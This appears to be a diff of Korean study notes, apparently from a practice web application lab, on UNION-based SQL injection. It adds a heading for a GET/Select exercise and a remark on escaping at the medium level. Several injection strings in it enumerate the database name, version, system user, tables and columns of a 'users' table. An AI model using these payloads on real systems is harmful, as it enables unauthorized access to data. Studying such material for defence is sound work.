@@ -11,16 +11,25 @@
 ![[Pasted image 20241010142503.png]]
 - 칼럼 순서를 확인할 수 있다.
 ![[Pasted image 20241010142620.png]]
-`'union select 1,database(),@@datadir,system_user(),@@version,6,7#`
+```
+'union select 1,database(),@@datadir,system_user(),@@version,6,7#
+```
 ![[Pasted image 20241010142850.png]]
 - 칼럼에 원하는 정보를 출력하도록 명령어를 삽입할 수 있다.
 
-`'union select 1,table_name,3,4,5,6,7 from information_schema.tables#`
+```
+'union select 1,table_name,3,4,5,6,7 from information_schema.tables#
+```
 ![[Pasted image 20241010143205.png]]
 
-`'union select 1,column_name,3,4,5,6,7 from information_schema.columns#`![[Pasted image 20241010143506.png]]
+```
+'union select 1,column_name,3,4,5,6,7 from information_schema.columns#
+```
+![[Pasted image 20241010143506.png]]
 
-`0'union select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name="users"#`
+```
+0'union select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name="users"#
+```
 ![[Pasted image 20241010143813.png]]
 
 ```
@@ -30,4 +39,10 @@
 
 medium
 ![[Pasted image 20241010144349.png]]
+= 구문 뒤에 \\를 통해 sql 구문을 일반 문자열로 인식되도록 한다.
 
+
+# SQL Injection (GET/Select)
+---
+![[Pasted image 20241010144726.png]]
+ 
